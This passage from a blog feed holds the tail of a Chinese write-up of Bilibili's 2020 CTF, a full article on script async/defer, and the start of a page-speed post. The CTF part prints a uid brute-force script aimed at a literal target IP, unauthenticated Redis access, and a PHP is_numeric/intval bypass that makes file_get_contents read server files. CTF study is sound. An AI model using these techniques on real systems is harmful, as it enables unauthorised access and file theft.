class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span 